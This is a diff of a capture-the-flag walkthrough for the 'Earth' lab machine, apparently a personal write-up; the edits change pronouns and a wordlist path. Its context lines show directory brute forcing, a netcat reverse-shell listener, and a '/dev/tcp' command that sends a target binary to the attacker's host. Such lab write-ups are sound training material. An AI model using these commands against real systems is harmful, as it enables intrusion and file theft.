@@ -40,7 +40,7 @@ Accessing `https://192.168.56.106` reveals a Fedora admin page. Inspecting the S
 - `earth.local`
 - `terratest.earth.local`
 
-Add these to your `/etc/hosts` file:
+Add these to my `/etc/hosts` file:
 
 ```bash
 echo "192.168.56.106 earth.local" | sudo tee -a /etc/hosts
@@ -56,8 +56,8 @@ echo "192.168.56.106 terratest.earth.local" | sudo tee -a /etc/hosts
 Use `gobuster` to find hidden directories:
 
 ```bash
-gobuster dir -u http://earth.local -w /usr/share/wordlists/dirb/common.txt
-gobuster dir -u https://terratest.earth.local -w /usr/share/wordlists/dirb/common.txt -k
+gobuster dir -u http://earth.local -w /home/lin/Documents/dirb/rockyou.txt
+gobuster dir -u https://terratest.earth.local -w  /home/lin/Documents/dirb/rockyou.txt -k
 ```
 
 Notable findings:
@@ -106,7 +106,7 @@ The panel provides a command execution interface.
 
 ### 🐚 Establish Reverse Shell
 
-**On your machine (192.168.56.103):**
+**On my machine (192.168.56.103):**
 
 ```bash
 nc -lvnp 4444
@@ -134,7 +134,7 @@ Notable binary: `/usr/bin/reset_root`
 
 ### 📤 Transfer Binary for Analysis
 
-**On your machine:**
+**On my machine:**
 
 ```bash
 nc -lvnp 3333 > reset_root
@@ -148,7 +148,7 @@ cat /usr/bin/reset_root > /dev/tcp/192.168.56.103/3333
 
 ### 🧪 Analyze with `ltrace`
 
-On your machine:
+On my machine:
 
 ```bash
 ltrace ./reset_root
